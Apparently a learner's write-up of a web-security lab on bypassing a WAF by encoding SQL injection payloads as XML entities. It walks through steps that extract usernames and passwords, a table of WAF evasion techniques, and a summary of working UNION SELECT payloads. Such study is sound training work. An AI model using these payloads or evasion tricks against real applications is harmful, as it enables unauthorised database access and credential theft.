# Filter Bypass via XML Encoding

---

## What is Filter Bypass?
Some applications implement WAF (Web Application Firewall) or input filters
that block common SQLi payloads like `UNION`, `SELECT`, `--` etc.
The attacker encodes or obfuscates the payload to bypass these filters.

---

## Lab: SQLi with Filter Bypass via XML Encoding

### What is it?
The application uses XML input to process data.
A WAF detects and blocks standard SQLi keywords.
By encoding the payload using XML entities, we bypass the filter.

### Why XML?
XML supports character encoding natively.
The database decodes the XML entities before processing the query,
but the WAF sees only encoded characters and doesn't recognize the attack.

---

## How it Works

### Normal Payload (Blocked by WAF)
```sql
UNION SELECT username FROM users
```

### Encoded Payload (Bypasses WAF)
```xml
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;username&#32;FROM&#32;users
```

### Using Hackvertor Extension (Burp Suite)
Select payload → right click → Extensions → Hackvertor → Encode → `dec_entities`

---

## Attack Steps

### Step 1 — Find the Injection Point
The vulnerable parameter is inside an XML body:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Step 2 — Test for SQLi
```xml
<storeId>1 UNION SELECT NULL</storeId>
```
→ WAF blocks this

### Step 3 — Encode the Payload
```xml
<storeId>
    <@dec_entities>1 UNION SELECT username||'~'||password FROM users<@/dec_entities>
</storeId>
```

### Step 4 — Extract Credentials
Response returns:
```
administrator~s3cur3p4ssw0rd
```

---

## Key Concepts

### WAF Bypass Techniques (General)
| Technique | Example |
|-----------|---------|
| XML encoding | `&#85;&#78;&#73;&#79;&#78;` |
| URL encoding | `%55%4e%49%4f%4e` |
| Case variation | `uNiOn SeLeCt` |
| Comments | `UN/**/ION SEL/**/ECT` |
| Double encoding | `%2555%254e%2549%254f%254e` |

---

## What I Learned
- WAFs look for known patterns, encoding hides these patterns
- XML context introduces new encoding opportunities
- Hackvertor extension in Burp Suite automates XML encoding
- Always check if the application uses XML — it's often overlooked
- String concatenation `||'~'||` helps extract multiple columns in one shot

---

## Key Payloads Summary

| Purpose | Payload |
|---------|---------|
| Detect columns | `1 UNION SELECT NULL` (encoded) |
| Extract credentials | `1 UNION SELECT username\|\|'~'\|\|password FROM users` (encoded) |
| XML entity encode | `&#85;&#78;&#73;&#79;&#78;` = `UNION` |
